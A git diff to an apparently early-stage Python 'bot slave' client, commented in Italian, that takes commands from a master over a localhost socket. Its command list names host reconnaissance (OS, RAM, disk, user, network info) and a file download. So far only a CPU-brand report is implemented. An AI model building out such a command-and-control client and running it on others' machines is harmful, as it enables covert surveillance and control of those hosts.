@@ -1,10 +1,31 @@
 """Implementazione delle funzioni asincrone per la gestione del client (bot slave)."""
 # import time
 import asyncio
+# from cpuinfo import get_cpu_info
+import cpuinfo
+
+# from ..utilities import bot_slave_utilities as bot_slave
+from ..utilities.bot_slave_utilities import bot_slave_utilities
+
 
 HOST = "127.0.0.1"
 PORT = 9999
 __response_options = {"1": "OS-TYPE", "2": "RAM", "3": "DISK", "4": "USER", "5": "STATUS", "6": "IO-CONNECTED", "7": "NETWORK-INFO", "8": "DOWNLOAD-FILE"}
+
+
+def get_cpu_report():
+    """Report delle informazioni della CPU dell'host."""
+    cpu_report = cpuinfo.get_cpu_info()
+    return cpu_report['brand_raw']
+
+
+def command_to_execute(case: str) -> str:
+    """Gestione dell'operazione impartita dal master da eseguire."""
+    match case:
+        case 'OS-TYPE':
+            return get_cpu_report()
+        case _:
+            return "NULL"
 
 
 async def run() -> None:
@@ -21,11 +42,14 @@ async def run() -> None:
             raise Exception("Socket closed!")
         print(f"Received from server: {response.decode()!r}")
         if response.decode() in __response_options.values():  # Controlliamo che il valore ottenuto matchi con qualche operazione presente nel dizionario
-            print("Response match!")
             """
             In questo momento il client invia al loop una nuova richiesta da effettuare. In questo punto invece andrà effettuata l'invocazione corrispondente
             al metodo
+            TODO: Aggiungere CASE STATEMENT
             """
+            report = command_to_execute(response.decode())
+            writer.write(report.encode())
+            await asyncio.sleep(1)
             writer.write(operation_keyword.encode())
         else:  # In caso contrario chiediamo al server di inviare una nuova risposta valida
             writer.write(operation_keyword.encode())
